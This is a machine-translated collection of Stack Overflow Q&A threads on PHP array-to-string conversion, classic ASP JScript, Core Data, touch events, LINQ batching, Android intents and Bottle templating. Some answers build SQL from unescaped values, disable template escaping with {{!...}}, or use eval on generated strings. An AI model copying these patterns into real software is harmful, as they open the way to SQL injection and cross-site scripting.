    'item2'  => 'object2',
    'item-n' => 'object-n'
);

$output = implode(', ', array_map(
    function ($v, $k) {
        if(is_array($v)){
            return $k.'[]='.implode('&'.$k.'[]=', $v);
        }else{
            return $k.'='.$v;
        }
    }, 
    $input, 
    array_keys($input)
)); 
```

或者：

```
$output = implode(', ', array_map(
    function ($v, $k) { return sprintf("%s='%s'", $k, $v); },
    $input,
    array_keys($input)
)); 
```

* * *

## 回答 #3

> 赞同：44
> 
> 时间：2016-06-17T15:12:37.917

我花了测量（100000 次迭代），粘合关联数组的最快方法是什么？

**Objective:**获取一行1000个item，格式如下："key:value,key2:value2"

我们有数组（例如）：

```
$array = [
    'test0' => 344,
    'test1' => 235,
    'test2' => 876,
    ...
]; 
```

**测试一：**

使用**http_build_query**和**str_replace**：

```
str_replace('=', ':', http_build_query($array, null, ',')); 
```

内爆 1000 个元素的平均时间：0.00012930955084904

**测试二：**

使用**array_map**和**implode**：

```
implode(',', array_map(
        function ($v, $k) {
            return $k.':'.$v;
        },
        $array,
        array_keys($array)
    )); 
```

内爆 1000 个元素的平均时间：0.0004890081976675

**测试三：**

使用**array_walk**和**implode**：

```
array_walk($array,
        function (&$v, $k) {
            $v = $k.':'.$v;
        }
    );
implode(',', $array); 
```

内爆 1000 个元素的平均时间：0.0003874126245348

**测试四：**

使用**foreach**：

```
 $str = '';
    foreach($array as $key=>$item) {
        $str .= $key.':'.$item.',';
    }
    rtrim($str, ','); 
```

内爆 1000 个元素的平均时间：0.00026632803902445

**我可以得出结论，粘合数组的最佳方法 - 使用 http_build_query 和 str_replace**

* * *

## 回答 #4

> 赞同：9
> 
> 时间：2012-07-11T07:13:34.967

我会使用`serialize()`or `json_encode()`。

虽然它不会为您提供所需的确切结果字符串，但稍后编码/存储/检索/解码会容易得多。

* * *

## 回答 #5

> 赞同：3
> 
> 时间：2012-07-11T07:28:24.773

使用[array_walk](http://php.net/array_walk)

```
$a = array("item1"=>"object1", "item2"=>"object2","item-n"=>"object-n");
$r=array();
array_walk($a, create_function('$b, $c', 'global $r; $r[]="$c=$b";'));
echo implode(', ', $r); 
```

[IDEONE](http://ideone.com/W9Sdv)

* * *

## 回答 #6

> 赞同：3
> 
> 时间：2017-02-27T22:05:24.537

你也可以使用 PHP 的[array_reduce](http://php.net/manual/en/function.array-reduce.php)，

```
$a = ['Name' => 'Last Name'];

function acc($acc,$k)use($a){ return $acc .= $k.":".$a[$k].",";}

$imploded = array_reduce(array_keys($a), "acc"); 
```

* * *

## 回答 #7

> 赞同：3
> 
> 时间：2019-03-29T00:04:38.537

还有更常见的[var_export](https://www.php.net/manual/en/function.var-export.php)和[print_r](https://www.php.net/manual/en/function.print-r.php)用于打印调试输出，但这两个函数都可以采用可选参数来返回字符串。

使用问题中的示例作为数据。

```
$array = ["item1"=>"object1", "item2"=>"object2","item-n"=>"object-n"]; 
```

## 用于将`print_r`数组转换为字符串

这将输出变量的人类可读表示。

```
$string = print_r($array, true);
echo $string; 
```

将输出：

```
Array
(
    [item1] => object1
    [item2] => object2
    [item-n] => object-n
) 
```

## 用于将`var_export`数组转换为字符串

这将输出变量的 php 字符串表示形式。

```
$string = var_export($array, true);
echo $string; 
```

将输出：

```
array (
  'item1' => 'object1',
  'item2' => 'object2',
  'item-n' => 'object-n',
) 
```

因为它是有效的 php，所以我们可以对其进行评估。

```
eval('$array2 = ' . var_export($array, true) . ';');
var_dump($array2 === $array); 
```

输出：

```
bool(true) 
```

* * *

## 回答 #8

> 赞同：2
> 
> 时间：2012-07-11T07:16:46.530

改变

```
-    return substr($result, (-1 * strlen($glue)));
+    return substr($result, 0, -1 * strlen($glue)); 
```

如果你想在没有最后一个 $glue 的情况下重新调整整个字符串

```
function key_implode(&$array, $glue) {
    $result = "";
    foreach ($array as $key => $value) {
        $result .= $key . "=" . $value . $glue;
    }
    return substr($result, (-1 * strlen($glue)));
} 
```

以及用法：

```
$str = key_implode($yourArray, ","); 
```

* * *

## 回答 #9

> 赞同：2
> 
> 时间：2015-11-24T10:01:04.043

用于调试目的。递归将嵌套数组的数组写入字符串。用过foreach。函数存储国家语言字符。

```
function q($input)
{
    $glue = ', ';
    $function = function ($v, $k) use (&$function, $glue) {
        if (is_array($v)) {
            $arr = [];
            foreach ($v as $key => $value) {
                $arr[] = $function($value, $key);
            }
            $result = "{" . implode($glue, $arr) . "}";
        } else {
            $result = sprintf("%s=\"%s\"", $k, var_export($v, true));
        }
        return $result;
    };
    return implode($glue, array_map($function, $input, array_keys($input))) . "\n";
} 
```

* * *

## 回答 #10

> 赞同：2
> 
> 时间：2018-05-04T15:30:43.387

这是一个简单的例子，使用类：

```
$input = array(
    'element1'  => 'value1',
    'element2'  => 'value2',
    'element3' =>  'value3'
);

echo FlatData::flatArray($input,', ', '=');

class FlatData
{

    public static function flatArray(array $input = array(), $separator_elements = ', ', $separator = ': ')
    {
        $output = implode($separator_elements, array_map(
            function ($v, $k, $s) {
                return sprintf("%s{$s}%s", $k, $v);
            },
            $input,
            array_keys($input),
            array_fill(0, count($input), $separator)
        ));
      return $output;
    }

} 
```

* * *

## 回答 #11

> 赞同：1
> 
> 时间：2017-05-24T10:09:59.527

用于从数组中创建 mysql where 条件

```
$sWheres = array('item1'  => 'object1',
                 'item2'  => 'object2',
                 'item3'  => 1,
                 'item4'  => array(4,5),
                 'item5'  => array('object3','object4'));
$sWhere = '';
if(!empty($sWheres)){
    $sWhereConditions = array();
    foreach ($sWheres as $key => $value){
        if(!empty($value)){
            if(is_array($value)){
                $value = array_filter($value); // For remove blank values from array
                if(!empty($value)){
                    array_walk($value, function(&$item){ $item = sprintf("'%s'", $item); }); // For make value string type 'string'
                    $sWhereConditions[] = sprintf("%s in (%s)", $key, implode(', ', $value));
                }
            }else{
                $sWhereConditions[] = sprintf("%s='%s'", $key, $value);
            }
        }
    }
    if(!empty($sWhereConditions)){
        $sWhere .= "(".implode(' AND ', $sWhereConditions).")";
    }
}
echo $sWhere;  // (item1='object1' AND item2='object2' AND item3='1' AND item4 in ('4', '5') AND item5 in ('object3', 'object4')) 
```

* * *

## 回答 #12

> 赞同：0
> 
> 时间：2021-12-19T07:32:33.063

使用explode 从任何字符串中获取数组总是可以的，因为数组总是标准结构。

但是关于数组到字符串，有什么理由在代码中使用预定义的字符串吗？而字符串应该以任何格式使用！

foreach 的好处是您可以根据需要创建字符串！我建议仍然使用 foreach 安静可读且干净。

```
$list = array('a'=>'1', 'b'=>'2', 'c'=>'3');

$sql_val = array();
foreach ($list as $key => $value) {
    $sql_val[] = "(" . $key . ", '" . $value . "') ";
}
$sql_val = implode(', ', $sql_val); 
```

结果：

```
(a, '1') , (b, '2') , (c, '3') 
```

|

```
(a: '1') , (b: '2') , (c: '3') 
```

|

```
a:'1' , b:'2' , c:'3' 
```

等等

# javascript - 如何使用经典 ASP 在服务器端包含一个 javascript 文件？

> ID：11427400
> 
> 赞同：1
> 
> 时间：2012-07-11T07:12:07.697
> 
> 标签：javascript, xml, json, asp-classic

如果有人能告诉我这个名为“test.asp”的文件中的这个相当简单的代码有什么问题吗？

```
<script src="jquery-1.2.6.js" type="text/javascript" language="javascript" runat="server"></script>
<script src="jquery.xml2json.js" type="text/javascript" language="javascript" runat="server"></script>

<%
var xml = '<xml><message>Hello world</message></xml>';
var json = $.xml2json(xml);
alert(json.message);
%> 
```

我收到的错误消息是 Microsoft JScript 运行时错误

'$' 未定义

我尝试过 XMLObjectifier 和 xml2json.js，共同的主题是我似乎无法在我的经典 ASP 文件中执行这些 javascript 库。

我的理解是，编写 ASP 的 JScript 是 javascript……只是在服务器端。那么我可以在我的 test.asp 文件中运行/引用 .js 文件吗？

非常感谢你！如您所知，我的 asp 文件生成 xml，但我想将其转换为 json。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-07-11T07:27:35.663

> *请注意 - 我并没有忽视可以在浏览器中使用 JScript 的事实，根据这个答案的优秀信息：[JavaScript 和 JScript 之间有什么区别？](https://stackoverflow.com/questions/135203/whats-the-difference-between-javascript-and-jscript). 这个问题显然是在讨论服务器上下文中的 JScript，所以从这里开始，术语“JScript”是指在 ASP 或 Windows 脚本中使用的 JScript 版本*

两种***语言***可以相同/相似（尽管请注意 JScript*并不完全是*JavaScript），但它们的运行时环境可以完全不同。

您尝试使用的这些库的 JavaScript 是一种期望在浏览器中运行的客户端脚本语言。浏览器就是此代码的运行时环境，提供 HTML 规范中规定的对象和服务（例如，内在`window`或`document`对象）。

JScript 是一种类似 javascript 的语言，在这种情况下，它期望在服务器（或 Windows 脚本环境）上运行 - 即在与浏览器完全不同的运行时环境中

那么，在这种情况下，在服务器上包含一个客户端 JavaScript 库的想法，礼貌地说是错误的。你能真正得到的最接近的是在像[Node.js](http://nodejs.org/)这样的服务器平台上，它是“纯”JavaScript；但即使这样也无法运行像 jQuery 这样的客户端库，因为它们依赖于浏览器提供的运行时环境。是的，这可能是“伪造的”和“存根的”；但不是为了任何真正的利益。

停止尝试这样做，并将其重写为普通的客户端代码。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2016-02-19T22:35:14.037

我使用 JScript 在现代 React（节点）项目、传统经典 ASP 项目和老化的 Web 表单项目之间进行互操作。Classic ASP 在服务器上使用 JScript 的能力非常有用。我能够在 Classic ASP、Web 表单和节点（反应）项目之间集中所有设置（api、连接字符串、应用程序设置等）。一旦他们都阅读了相同的设置，我就删除了他们各自的 web.config 设置

Babel 有一个[JScript 转换](https://babeljs.io/docs/plugins/transform-jscript/)，可让您将代码转换为 JScript 的附加级别（我为 Classic ASP 捆绑包转换了 ES2016 -> ES5 -> JScript）。

**include/config.js（babel 生成的设置）**

```
var config = {
    "cdnBaseUrl": "https://api.example.com",
    "apis": { ... },
    ...
} 
```

**包含/Config.asp**

```
' Import the global JSON object from crockford to parse JSON in VBScript server-side
<script language="JScript" runat="server" src="json2.js"></script>

' Import global config object that can be called from JScript and VBScript interchangeably
<script language="JScript" runat="server" src="config.js"></script>

<script language="JScript" runat="server">
  /** DEFINE GLOBAL FUNCTIONS THAT CAN INTEROP WITH VBSCRIPT HERE */

  function requireScript(path) {
      var resourceUrl = config.cdnBaseUrl + path
      return ('<sc' + 'ript src="' + resourceUrl + '"></sc' + 'ript>')
  }

  ....
</script> 
```

**包含/AppHead.asp**

```
<!-- Include the settings and global helpers -->
<!--#include virtual="/include/Config.asp"-->

<!-- Build script tags in head that point to the correct CDN base url -->
<%=requireScript("/assets/react-client.js")%> 
```

为所有设置编写适配器将是一种折磨（用 VBScript 解析 XML/JSON 很糟糕）。

# sql - 如何将 SQL DB 下载到 CoreData for ios

> ID：11427402
> 
> 赞同：1
> 
> 时间：2012-07-11T07:12:22.527
> 
> 标签：sql, ios, core-data

我想知道为了将 SQL DB 下载到核心数据中我必须考虑什么？我不确定在格式化 SQL DB 时必须使用哪些框架，或者是否有任何特殊要求。

任何帮助、建议、教程链接将不胜感激。我已经进行了一些搜索，但很难理解事物，因为我不确定我正在寻找的内容是否正确。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-07-16T22:01:37.910

我不确定我是否理解您所追求的，但也许 2 个链接会有所帮助：

*   [Navicat](http://www.navicat.com/en/products/navicat_sqlite/sqlite_overview.html)是一个应用程序，可让您将数据从多种格式（Excel、xml、...）加载到 Sqlite DB 。这是将数据获取到数据库的一种简单方法。正如 David H 所提到的，您可以通过[FMDB 之](https://github.com/ccgus/fmdb)类的 Sqlite 包装器在不使用 Core Data 的情况下处理数据。然后您可以使用 SQL 命令访问数据。

*   nsscreencst.com 提供了一个完全不同的教程：[Importing into Core Data](http://nsscreencast.com/episodes/12-importing-into-core-data)是一个教程，展示了如何从 Web API 将 JSON 数据导入 Core Data。这可能与您的用例有关。不幸的是，那里的视频每月收费 9 美元，但恕我直言，他们做得非常好。

（我不隶属于上述任何一家公司）

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-07-15T22:11:14.970

这是不可能的——即使 Core Data 可以使用 SQLite 进行存储，也没有导入/导出。你真的有两个选择：

1）如果您有一个要在 iOS 应用程序中使用 Core Data 的数据库，那么您可以编写一个非常简单的 Mac 应用程序来与您的 SQL 存储交互，并使用您基于创建的 Core Data Schema 在 Core Data 中复制它在您的 SQL 数据库上。这样做的好处是使用 mac 应用程序测试和开发更简单。然后，您的 iOS 应用程序可以使用最终的 Core Data 存储库（通过包含 Core Data Schema）。

2) 在您的 iOS 应用程序中进行所有导入。这可能需要更长的时间来开发，但您可以将 SQL 数据库动态下载到手机中并使用 SQLite 读取它。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-07-16T05:58:35.263

要导入数据，您必须从 SQLite 数据库中的每条记录创建 NSManagedObjects 对象。根据您的数据库模型的复杂性，这可能非常棘手。

Marcus Zarra 很好地介绍了如何从 JSON 创建 NSManagedObjects：[https](https://stackoverflow.com/a/2363996/480069) ://stackoverflow.com/a/2363996/480069 。这应该让您了解如何开始。正如马库斯所说，请注意对象图中的关系，这样在拥有复杂关系时就不会陷入循环。

也有很多很好的教程如何序列化 NSManagedObjects，所以只要给谷歌一试：`NSManagedObject serialize`.

# javascript - 如何让 touchEnd 表现得像 mouseUp？

> ID：11427403
> 
> 赞同：14
> 
> 时间：2012-07-11T07:12:26.263
> 
> 标签：javascript, html, css, touch, dom-events

On`mouseUp`或者`touchEnd`我想获取发生该事件的元素的引用。

[**演示**](http://jsfiddle.net/adu9a/)

在此示例中，您需要单击一个元素，拖动鼠标并在另一个元素上释放。释放鼠标时，该元素的背景将变为红色。我的代码适用于鼠标事件，但不适用于触摸设备。

当`touchStart`在一个元素上并且手指在另一个元素上释放时，我只得到对第一个元素的引用。

我需要更改什么以使触摸事件与鼠标事件完全一样？

```
var isMouseDown = false;    

var panel1 = document.getElementById( 'panel1' );
var panel2 = document.getElementById( 'panel2' );

panel1.onmousedown = onDocumentMouseDown;
panel1.onmouseup = onDocumentMouseUp;
panel1.onmousemove = onDocumentMouseMove;   
panel1.addEventListener( 'touchstart', onDocumentTouchStart, false );
panel1.addEventListener( 'touchmove', onDocumentTouchMove, false );
panel1.addEventListener( 'touchend', onDocumentTouchEnd, false );

panel2.onmousedown = onDocumentMouseDown;
panel2.onmouseup = onDocumentMouseUp;
panel2.onmousemove = onDocumentMouseMove;
panel2.addEventListener( 'touchstart', onDocumentTouchStart, false );
panel2.addEventListener( 'touchmove', onDocumentTouchMove, false );
panel2.addEventListener( 'touchend', onDocumentTouchEnd, false );

function onDocumentMouseDown(event) {
    event.preventDefault();
    panel1.style.background="#2E442E";
    panel2.style.background="#5D855C";      
}

function onDocumentMouseUp(event) {
    event.preventDefault();
    this.style.background="#ff0000";
}

function onDocumentMouseMove( event ) {

}   

function onDocumentTouchStart( event ) {
    event.preventDefault();
    panel1.style.background="#2E442E";
    panel2.style.background="#5D855C";

}

function onDocumentTouchMove( event ) {     

}

function onDocumentTouchEnd( event ) {
    event.preventDefault();         
    this.style.background="#ff0000";        

} 
```

* * *

## 回答 #1

> 赞同：12
> 
> 时间：2013-03-13T12:41:40.793

这是一个有趣的问题。感谢那。这就是我所做的。我已经修改了你的`touchmove`处理程序：

```
 function onDocumentTouchMove(event) {
    onDocumentTouchMove.x = event.changedTouches[event.changedTouches.length - 1].clientX;
    onDocumentTouchMove.y = event.changedTouches[event.changedTouches.length - 1].clientY;
} 
```

在这个处理程序中，我保存了用户移动到的最后一个坐标。这很可能是用户将他的手指、鼻子、指关节、触控笔等从触摸表面上移开的点。然后我在处理程序中使用这些坐标`touchend`来查找围绕它们的元素。

```
 function onDocumentTouchEnd(event) {
    event.preventDefault();
    var elem = document.elementFromPoint(onDocumentTouchMove.x, onDocumentTouchMove.y);
    elem.style.background = "#ff0000";
} 
```

为此，我使用了`document.elementFromPoint`[（mdn 链接）](https://developer.mozilla.org/en-US/docs/DOM/document.elementFromPoint)。它是[CSSOM 规范](http://dev.w3.org/csswg/cssom-view/#widl-Document-elementFromPoint-Element-float-x-float-y)提供给我们的那些黄金但相当未知的方法之一。

这是[小提琴](http://jsfiddle.net/PGrXy/)。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-12T02:25:37.820

从表面上看，这是触摸事件的预期行为。但是，我有一个解决方法！

我没有对此进行过广泛的测试，但它似乎至少可以在移动 Safari 上`touchStart`运行`touchEnd`。

基本上我们要做的是捕获文档上的所有触摸事件，因为它们处于捕获阶段（请参阅[http://www.w3.org/TR/DOM-Level-3-Events/](http://www.w3.org/TR/DOM-Level-3-Events/)）。这些事件的处理程序将在此位置找到 DOM 元素并使用“正确”目标重新发送事件。

似乎`touchEnd`事件的位置没有很好地定义，所以我不得不查询`changedEvents`数组以获取最后触摸的位置。我不确定这是否适用于`touchMove`事件等。

```
function rerouteTouch (evt) {
    if (evt.passthrough) { // Ignore if already rerouted
        return;
    }
    evt.stopPropagation();
    var newevt = document.createEvent('TouchEvent');
    newevt.initTouchEvent (
        evt.type,
        evt.bubbles,
        evt.cancelable,
        evt.view,
        evt.detail,
        evt.screenX,
        evt.screenY,
        evt.clientX,
        evt.clientY,
        evt.ctrlKey,
        evt.altKey,
        evt.shiftKey,
        evt.metaKey,
        evt.touches,
        evt.targetTouches,
        evt.changedTouches,
        evt.scale,
        evt.rotation);
    newevt.passthrough = true; // Only reroute once

    var target;
    var x = (evt.type === 'touchend') ? evt.changedTouches[0].pageX : evt.pageX;
    var y = (evt.type === 'touchend') ? evt.changedTouches[0].pageY : evt.pageY;

    if (document !== (target = document.elementFromPoint(x, y))) {
        target.dispatchEvent(newevt);
    }
}

document.addEventListener( 'touchstart', rerouteTouch, true); // Third arg is true to indicate capture-phase
document.addEventListener( 'touchend', rerouteTouch, true); 

...

// Your event handlers here 
```

这是一个 jsfiddle，它在我的移动 safari 上按预期工作：http: [//jsfiddle.net/DREer/12/](http://jsfiddle.net/DREer/12/)

* * *

## 回答 #3

> 赞同：-1
> 
> 时间：2012-07-12T05:30:23.247

也许如果您可以将 jQuery 包含到您的程序中，您可以执行以下操作：

```
$('#itemId').on('touchEnd',function(){ this.trigger('mouseUp') }); 
```

我不确定 jQuery 开箱即用是否支持此事件，但您可以随时尝试 jQuery movil，希望对您有所帮助

# c# - 将用户控件添加到树视图

> ID：11427405
> 
> 赞同：0
> 
> 时间：2012-07-11T07:12:35.743
> 
> 标签：c#, user-controls, treeview

我正在创建一个用户控件，用于搜索树视图。我想将用户控件添加到树视图的顶部。我可以通过`treeview.controls.add(mycontrol);`

然而，我的用户控件我放置在树的顶部并隐藏了树的部分。我可以以某种方式更改树视图内树的位置吗？还是我需要另一种方法？

只是为了澄清我不希望用户控件成为树的一部分。我只想将它显示在树视图的顶部

# android - 如何从一个活动中调用另一个活动（类）？

> ID：11427407
> 
> 赞同：-6
> 
> 时间：2012-07-11T07:12:39.290
> 
> 标签：android, android-intent

我正在使用对话框。我希望如果我单击按钮，则调用另一个活动。但它给出了以下错误。//构造函数Intent(new DialogInterface.OnClickListener(){}, Class)未定义

这是代码

```
 builder1.setNegativeButton("secondact", new DialogInterface.OnClickListener() {

                public void onClick(DialogInterface dialog, int which) {
                    // TODO Auto-generated method stub
                    Intent i=new Intent(this, FbsampleActivity.class)

                }
            }); 
```

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-07-11T07:15:27.610

开始为：

```
builder1.setNegativeButton("secondact", new DialogInterface.OnClickListener() {

                public void onClick(DialogInterface dialog, int which) {
                    // TODO Auto-generated method stub
                    Intent i=new Intent(Current_Activity.this, FbsampleActivity.class);
                    //or

                    //Intent i=new Intent(getApplicationContext(), FbsampleActivity.class);
                     startactivity(i);
                }
            }); 
```

**注意：** 不要使用`getBaseContext()`use`getApplicationContext()`或 Current_Activity.this`enter code here`来启动新活动

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-07-11T07:17:31.213

如果使用`this`，则使用的类`Intent i=new Intent(this, FbsampleActivity.class)`是`DialogInterface.OnClickListener`类。您需要编写`YourOuterClass.this`（外部类）。尝试这个：

```
 builder1.setNegativeButton("secondact", new DialogInterface.OnClickListener() {

      public void onClick(DialogInterface dialog, int which) {
          // TODO Auto-generated method stub
          Intent i=new Intent(YourActivity.this, FbsampleActivity.class)
          startActivity(i);
        }
  }); 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-07-11T07:14:40.447

```
Intent i=new Intent(getApplicationContext(), FbsampleActivity.class) 
```

在您的情况下，“this”指的是 DialogInterface 类。您需要 Activity 的上下文。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-07-11T07:21:18.407

```
builder1.setNegativeButton("secondact", new DialogInterface.OnClickListener() {

                public void onClick(DialogInterface dialog, int which) {
                    // TODO Auto-generated method stub
                    Intent i=new Intent(YourActivityName.this,FbsampleActivity.class);
                    startActivity(i);
                }
            }); 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-07-11T07:40:16.670

**在您的代码中使用意图**下面的这一行..

```
 startactivity(i); 
```

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2012-07-11T07:43:54.063

像这样静态创建..

```
Intent i=new Intent(YourActivityName.this,ToWhichActivityYouWantToGo.class);
startActivity(i); 
```

# neural-network - 从神经网络中提取特征

> ID：11427411
> 
> 赞同：7
> 
> 时间：2012-07-11T07:12:59.557
> 
> 标签：neural-network, ocr, feature-detection

我正在使用神经网络对字母和数字进行简单的识别。到目前为止，我使用字母图像的每个像素作为网络的输入。不用说，这种方法会产生非常大的网络。所以我想从我的图像中提取特征并将它们用作神经网络的输入。我的第一个问题是字母的哪些属性有利于识别它们。第二个问题是如何将这些特征表示为神经网络的输入。例如，我可能已经检测到字母中的所有角，并将它们作为 (x,y) 点的向量。如何将此向量转换为适合 NN 的东西（因为不同字母的向量大小可能不同）。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-07-11T09:02:53.537

这篇文章，[人工智能简介。Kluever (2008) 的使用人工神经网络的](https://encrypted.google.com/url?sa=t&rct=j&q=introduction%20to%20artificial%20intelligence%20ocr%20using%20artificial%20neuralnetworks%20by%20kurt&source=web&cd=1&ved=0CE4QFjAA&url=http://www.kloover.com/publications/Kluever_-_OCR_using_ANN.pdf&ei=zzv9T7-VKOHJ0QXUid2dBw&usg=AFQjCNFtl9N6oq07WnuqTa2l0EZI6cVsbA&cad=rja)OCR 对使用神经网络的 OCR 的 4 种特征提取技术进行了调查。他描述了以下方法：

*   运行长度编码 (RLE)：您需要一个二进制图像（即只有白色或黑色）。二进制字符串可以编码为更小的表示形式。
*   边缘检测：找到边缘。你可以很粗略，所以不是返回精确的 (x,y) 坐标，你可以通过只计算这样的边缘是否出现在减少的位置（即，在 20%、40%、60& 和 80% 上）来减少矩阵图像）。
*   `width * height`Count 'True Pixels'：这会将图像矩阵的维度减少到`width + height`. 您使用`width`向量和`height`向量作为单独的输入。
*   基本矩阵输入：你已经试过了；输入整个矩阵会得到很好的结果，但正如您所注意到的那样会导致高维数和训练时间。您可以尝试减小图像的大小（例如，从 200x200 到 50x50）。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-07-11T15:05:05.707

很多人已经为 OCR 采用了多种功能。其中最简单的当然是直接传递像素值。

OpenCV 样本中有一个字母识别数据，是从 UCI 数据集中提取的。它采用了大约 16 种不同的功能。检查此 SOF：[如何从 UCI 创建像“字母图像识别数据集”这样的图像数据](https://stackoverflow.com/questions/1270798/how-to-create-data-fom-image-like-letter-image-recognition-dataset-from-uci)

您还可以在其中一个答案中看到解释这一点的论文。你可以通过谷歌搜索得到它。

你也可能对[这个PPT](http://www.google.co.in/url?sa=t&rct=j&q=&esrc=s&source=web&cd=3&ved=0CFcQFjAC&url=http://www.iit.demokritos.gr/IIT_SS/Presentations/Off-Line%2520Handwritten%2520OCR.ppt&ei=QJb9T-bPA83OrQee0MHLBg&usg=AFQjCNHN_jijSFqHbQrlMfRi6vGEBPyxoQ&sig2=8_ictZXb3nkVFG3htI8kiw)感兴趣。它简要解释了当今使用的不同特征提取技术。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-09-03T15:15:16.977

如果您有一个非常高维的输入向量，那么我建议您应用主成分分析（PCA）来去除冗余特征并降低特征向量的维数。

# c# - Linq每次迭代选择5个项目

> ID：11427413
> 
> 赞同：35
> 
> 时间：2012-07-11T07:13:07.690
> 
> 标签：c#, linq

**Linq 根据我们的枚举器每次选择 5 个项目**

我们的列表例如`"theList"`有**100 个项目**，想要遍历列表并**在每次迭代中选择 5 个项目**，

示例代码，我们希望将其更改为我们想要的结果：

```
 theList = dt.AsEnumerable()
            .Select(row => new CustItem
            {
                Name = row.Field<string>("tName"),
                Title = row.Field<string>("tTitle"),
            }).ToList(); 
```

我们应该在循环中迭代它并每次处理选定的 5 个项目，或者将其传递给我们的其他方法：

类似的东西：

```
for (int i=0; i < 20 ; i++) 
```

我想`"i"`在语句上使用枚举`linq select`器并进行多重性来确定我们新结果集的边界。

* * *

## 回答 #1

> 赞同：41
> 
> 时间：2012-07-11T07:15:45.213

```
for (int i=0; i < 20 ; i++)
{
    var fiveitems = theList.Skip(i*5).Take(5);
} 
```

* * *

## 回答 #2

> 赞同：40
> 
> 时间：2012-07-11T07:14:40.227

听起来您想要[`Batch`](https://github.com/whut/morelinq/blob/master/MoreLinq/Batch.cs)来自[MoreLINQ](https://github.com/whut/morelinq)的运算符：

```
foreach (var batch in query.Batch(5))
{
    foreach (var item in batch)
    {
        ...
    } 
} 
```

* * *

## 回答 #3

> 赞同：31
> 
> 时间：2012-07-12T02:18:14.067

您也可以通过利用整数算术和`GroupBy`方法来使用纯 linq 执行此操作：

```
int blockSize = 5;
var group = theList.Select((x, index) => new { x, index })
                   .GroupBy(x => x.index / blockSize, y => y.x);

foreach (var block in group)
{
    // "block" will be an instance of IEnumerable<T>
    ...
} 
```

这种方法有许多优点，但不一定立即显而易见：

*   执行被延迟，因此在使用条件处理时它很有效
*   您不需要知道集合的长度，从而避免了多次枚举，同时通常也比其他方法更干净

* * *

## 回答 #4

> 赞同：4
> 
> 时间：2017-08-29T05:30:15.947

试试这个：

```
 for (int i = 0; i < list.Count; i = i + 5) {
                var fiveitems = list.Skip(i).Take(5);
                foreach(var item in fiveitems)
                {

                }
            } 
```

* * *

## 回答 #5

> 赞同：2
> 
> 时间：2015-03-26T16:41:38.000

以下静态扩展方法将使将列表分解为具有特定批量大小的多个列表的简单过程。

```
 public static IEnumerable<IEnumerable<T>> Batch<T>(this IEnumerable<T> items, int noOfItemsPerBatch)
    {
        decimal iterations = items.Count() / noOfItemsPerBatch;

        var roundedIterations = (int)Math.Ceiling(iterations);

        var batches = new List<IEnumerable<T>>();

        for (int i = 0; i < roundedIterations; i++)
        {
            var newBatch = items.Skip(i * noOfItemsPerBatch).Take(noOfItemsPerBatch).ToArray();
            batches.Add(newBatch);
        }

        return batches;
    } 
```

使用示例

```
var items = new int[] { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10 };

var batchedItems = items.Batch(4);

Assert.AreEqual(batchedItems.Count() == 3);
Assert.AreEqual(batchedItems[0].Count() == 4);
Assert.AreEqual(batchedItems[1].Count() == 4);
Assert.AreEqual(batchedItems[2].Count() == 2); 
```

# wpf - 如何在按钮鼠标上播放声音？

> ID：11427416
> 
> 赞同：1
> 
> 时间：2012-07-11T07:13:11.617
> 
> 标签：wpf

```
 <Button Width="100" Height="50" Content="Click Me!">
           <Button.Style>
                <Style TargetType="{x:Type Button}">
                    <Style.Triggers>
                         <Trigger Property="IsMouseOver" Value="True">
                          < here i want to play sound but how?>
                         </Trigger>
                    </Style.Triggers>
              </Style>
         </Button.Style>
   </Button> 
```

如果有人知道，我会尝试但没有找到任何活动来执行此操作，请帮助我

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-11T08:15:08.797

您可以轻松地将处理程序附加到[MouseEnter](http://msdn.microsoft.com/en-us/library/system.windows.uielement.mouseenter.aspx)和[MouseLeave](http://msdn.microsoft.com/en-us/library/system.windows.uielement.mouseleave)事件：

```
<Button Width="100" Height="50" Content="Click Me!"
        MouseEnter="Button_MouseEnter" MouseLeave="Button_MouseLeave" /> 

private void Button_MouseEnter(object sender, MouseEventArgs e)
{
    // start playing
}

private void Button_MouseLeave(object sender, MouseEventArgs e)
{
    // stop playing
} 
```

# javascript - 使用瓶子将列表从 python 传递到 js 的最佳方法是什么？

> ID：11427417
> 
> 赞同：4
> 
> 时间：2012-07-11T07:13:14.970
> 
> 标签：javascript, python, string, escaping, bottle

我使用 Bottle 作为 Web 服务器，需要将 python 列表传递给 javascript。

当我只做 {{myList}} 时，Bottle 转义列表中字符串的单引号并将它们显示为`&#039;` JS，反过来，它对它得到的结果并不满意。

我设法找到了解决方案，但我认为这不是最佳解决方案。

```
var tempList = '{{eval(myList)}}'.replace(/&#039;/g, "'");
var myNewList = eval(tempList); 
```

我想知道，有没有更好的方法来做到这一点？

**upd：**我将找到的解决方案移至“答案”部分。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-07-12T20:59:05.143

我开始使用 json （Python3 中的 json_dumps，simplejson 不会安装），但瓶子仍在转义单引号。我在 Bottle 手册中发现您可以使用感叹号跳过转义并更改我的代码：

```
var myNewList = {{!myList}}; 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-07-11T07:26:19.447

改用[`json`模块](http://docs.python.org/library/json.html)；毕竟它会输出有效的 JavaScript 表达式。

> JSON（JavaScript 对象表示法）是 JavaScript 语法（ECMA-262 第 3 版）的子集 […]

快速示例：

```
>>> import json
>>> json.dumps([1, 2, 'foo', 'bar'])
'[1, 2, "foo", "bar"]' 
```

将其直接放入您的模板中。我一直使用它来将有效的 JavaScript 数据结构放入我生成的网页中。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-07-11T07:31:24.997

